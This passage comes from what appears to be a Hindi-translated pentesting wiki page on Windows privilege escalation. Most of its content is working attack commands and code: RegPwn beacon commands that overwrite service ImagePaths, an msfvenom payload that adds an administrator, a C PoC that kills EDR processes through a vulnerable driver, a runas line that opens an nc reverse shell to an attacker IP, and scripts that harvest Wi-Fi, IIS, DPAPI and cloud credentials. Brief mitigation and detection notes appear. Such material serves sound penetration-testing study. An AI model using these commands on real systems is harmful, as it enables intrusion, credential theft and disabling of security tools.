2. secure-desktop copy को ट्रिगर करें (उदा., **LockWorkstation**), जो AT broker flow शुरू करता है।
3. **Win the race** एक **oplock** को `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर रखकर; जब oplock फायर हो, तब **HKLM Session ATConfig** key को एक protected HKLM target की तरफ **registry link** से बदल दें।
4. SYSTEM redirect किए गए HKLM path पर attacker-चयनित वैल्यू लिखता है।

एक बार जब आपके पास arbitrary HKLM value write हो, तो service configuration values ओवरराइट करके LPE की ओर pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसा service चुनें जिसे एक सामान्य user स्टार्ट कर सके (उदा., **`msiserver`**) और write के बाद उसे ट्रिगर करें। **Note:** सार्वजनिक रूप से उपलब्ध exploit implementation race के हिस्से के रूप में **वर्कस्टेशन को लॉक कर देता है**।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी रजिस्ट्री पर यह अनुमति है, तो इसका मतलब है कि **आप इससे उप-रजिस्ट्री बना सकते हैं**। Windows services के मामले में यह **मनमाना कोड निष्पादित करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable के पाथ को उद्धरण चिह्नों में नहीं रखा गया है, तो Windows स्पेस से पहले आने वाले हर हिस्से को निष्पादित करने की कोशिश करेगा।

उदाहरण के लिए, पाथ _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित को निष्पादित करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
built-in Windows services से संबंधित न होने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस भेद्यता का पता लगा सकते हैं और इसका शोषण कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप metasploit के साथ मैन्युअली एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service विफल हो तो कौन-सी क्रियाएँ की जाएँ। इस फ़ीचर को किसी binary की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary बदलने योग्य है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

चेक करें **permissions of the binaries** (शायद आप एक को overwrite कर के escalate privileges कर सकें) और **folders** की भी जाँच करें ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जांचें कि क्या आप किसी config file को संशोधित करके कोई विशेष फ़ाइल पढ़ सकते हैं या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator account द्वारा execute किया जाएगा (schedtasks)।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload — स्थायित्व/निष्पादन

Notepad++ अपने `plugins` उपफ़ोल्डरों के भीतर किसी भी plugin DLL को autoload करता है। यदि कोई writable portable/copy install मौजूद है, तो एक malicious plugin डालने पर हर लॉन्च पर `notepad++.exe` के भीतर automatic code execution हो जाता है (जिसमें `DllMain` और plugin callbacks शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर चलाएँ

**जाँचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जिसे किसी अन्य उपयोगकर्ता द्वारा execute किया जाएगा।**\
**निम्न पृष्ठ पढ़ें** ताकि आप और अधिक जान सकें रोचक **autoruns locations to escalate privileges** के बारे में:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर्स

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver arbitrary kernel read/write primitive expose करता है (अक्सर poorly designed IOCTL handlers में), तो आप kernel memory से सीधे SYSTEM token चोरी करके escalate कर सकते हैं। पूरा step‑by‑step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

जहाँ race-condition bugs में vulnerable call एक attacker-controlled Object Manager path खोलता है, lookup को जानबूझ कर धीमा करने से (max-length components या deep directory chains का उपयोग करके) विंडो microseconds से लेकर tens of microseconds तक बढ़ाई जा सकती है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive मेमोरी करप्शन primitives

Modern hive vulnerabilities आपको deterministic layouts groom करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को custom driver के बिना kernel paged-pool overflows में बदलने की अनुमति देती हैं। पूरी chain यहाँ देखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Missing FILE_DEVICE_SECURE_OPEN का दुरुपयोग device objects पर (LPE + EDR kill)

कुछ signed third‑party drivers अपना device object मजबूत SDDL के साथ IoCreateDeviceSecure के जरिए बनाते हैं पर DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL तब लागू नहीं होता जब device को extra component वाला path से खोला जाता है, जिससे कोई भी unprivileged user निम्नलिखित तरह के namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device खोल सके, driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक मामलों में देखी गई उदाहरण क्षमताएँ:
- किसी भी प्रक्रिया को full-access handle लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser)।
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks)।
- किसी भी प्रक्रिया को terminate करना, जिसमें Protected Process/Light (PP/PPL) भी शामिल हैं, जिससे AV/EDR को user land से kernel के माध्यम से kill करने की अनुमति मिलती है।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जो device objects DACL से सीमित किए जाने के लिए बनाए जा रहे हों, उन्हें बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- विशेषाधिकार वाले ऑपरेशनों के लिए कॉलर संदर्भ को वैध करें। प्रोसेस टर्मिनेशन या हैंडल रिटर्न की अनुमति देने से पहले PP/PPL चेक जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device नामों (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग संकेत करने वाले specific IOCTL sequences की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) को लागू करें और अपनी allow/deny सूचियाँ बनाए रखें।


## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं, तो आप किसी process द्वारा लोड की गई DLL को hijack करके **escalate privileges** कर सकते हैं।

PATH के अंदर मौजूद सभी फ़ोल्डरों की अनुमतियाँ जांचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग कैसे करें इसके बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file पर hardcoded अन्य ज्ञात कंप्यूटरों के लिए जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहरी से **प्रतिबंधित सेवाओं** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

अधिक [ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

If you get root user you can listen on any port (the first time you use `nc.exe` to listen on a port it will ask via GUI if `nc` should be allowed by the firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
To easily start bash as root, you can try `--default-user root`

आप `WSL` फ़ाइल सिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के उपयोगकर्ता क्रेडेंशियल्स को स्टोर करता है जिनमें **Windows** उपयोगकर्ताओं को **स्वचालित रूप से लॉग इन** किया जा सकता है। पहली नज़र में, यह ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook क्रेडेंशियल्स, Twitter क्रेडेंशियल्स, Gmail क्रेडेंशियल्स इत्यादि यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वचालित रूप से लॉग इन हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनके द्वारा Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन किया जा सकता है, जिसका मतलब यह है कि कोई भी **Windows application that needs credentials to access a resource** (server या website) **can make use of this Credential Manager** & Windows Vault और प्रदान किए गए क्रेडेंशियल्स का उपयोग कर सकता है ताकि उपयोगकर्ता बार-बार username और password न दर्ज करें।

जब तक applications Credential Manager के साथ इंटरैक्ट नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए रिसोर्स के लिए क्रेडेंशियल्स का उपयोग कर पाएँगी। इसलिए, यदि आपका एप्लिकेशन vault का उपयोग करना चाहता है, तो उसे किसी न किसी तरह **credential manager के साथ संवाद करके उस रिसोर्स के लिए क्रेडेंशियल्स का अनुरोध** करना चाहिए, जो default storage vault में होते हैं।

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
उसके बाद आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` के साथ `/savecred` विकल्प का उपयोग कर सकते हैं। निम्नलिखित उदाहरण एक SMB शेयर के माध्यम से रिमोट बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** विंडोज़ ऑपरेटिंग सिस्टम के भीतर डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है, विशेष रूप से asymmetric private keys के symmetric encryption के लिए उपयोग किया जाता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान करने के लिए user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के login secrets से व्युत्पन्न एक symmetric key के माध्यम से keys का encryption सक्षम करता है**। सिस्टम encryption की स्थितियों में, यह सिस्टम के domain authentication secrets का उपयोग करता है।

Encrypted user RSA keys, by using DPAPI, are stored in the %APPDATA%\Microsoft\Protect\{SID} directory, where {SID} represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, आमतौर पर 64 bytes के random data से बनी होती है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच restricted है, इसलिए इसे CMD में `dir` कमांड से सूचीबद्ध नहीं किया जा सकता, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त आर्ग्युमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग करके इसे डीक्रिप्ट कर सकते हैं।

ये **credentials files protected by the master password** आमतौर पर निम्न स्थानों पर स्थित होती हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to **decrypt**.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और automation tasks के लिए encrypted credentials को सुविधाजनक तरीके से store करने के लिए उपयोग किए जाते हैं। ये credentials **DPAPI** का उपयोग करके सुरक्षित किए जाते हैं, जिसका सामान्यत: मतलब है कि इन्हें केवल उसी user द्वारा उसी computer पर ही **decrypted** किया जा सकता है जहाँ इन्हें बनाया गया था।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें निम्न स्थानों पर पा सकते हैं:
`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` module का उपयोग करके किसी भी .rdg फाइलों को **decrypt** कर सकते हैं।\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
आप Mimikatz `sekurlsa::dpapi` module के साथ मेमोरी से **extract many DPAPI masterkeys** कर सकते हैं।

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग **save passwords** और अन्य जानकारी सहेजने के लिए करते हैं, यह न समझते हुए कि यह एक database फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे हमेशा खोजने और जाँचने योग्य माना जाना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है तो यह संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और इन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **SYSTEM privileges के साथ चलाए जाते हैं**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)** के शिकार होते हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (क्रेडेंशियल्स)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत किया जा सकता है, इसलिए आपको यह जांचना चाहिए कि वहाँ कुछ दिलचस्प तो नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के अंदर कोई एंट्री मिलती है तो वह संभवतः एक सहेजी हुई SSH key होगी। यह एन्क्रिप्टेड रूप में स्टोर होती है लेकिन इसे आसानी से डिक्रिप्ट किया जा सकता है का उपयोग करके [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रहा है और आप चाहते हैं कि यह boot पर स्वतः शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` के साथ जोड़ने और ssh के माध्यम से किसी मशीन पर लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना निगरानी वाली फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल जिसका नाम **SiteList.xml** हो खोजें

### Cached GPP Pasword

एक समय ऐसी एक सुविधा उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर custom local administrator accounts को तैनात करने की अनुमति देती थी। हालांकि, इस विधि में गंभीर सुरक्षा कमियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरी बात, इन GPPs के अंदर पासवर्ड, जो AES256 के साथ एक publicly documented default key का उपयोग करके एन्क्रिप्ट किए गए थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। इससे गंभीर जोखिम उत्पन्न होता था, क्योंकि इससे users elevated privileges प्राप्त कर सकते थे।

इस जोखिम को कम करने के लिए एक function विकसित किया गया जो locally cached GPP फाइलों को स्कैन करता है जिनमें "cpassword" field खाली नहीं है। ऐसी फाइल मिलने पर, function पासवर्ड को decrypt करता है और एक custom PowerShell object लौटाता है। यह object GPP और फाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा कमजोरियों की पहचान और remediation में मदद करता है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
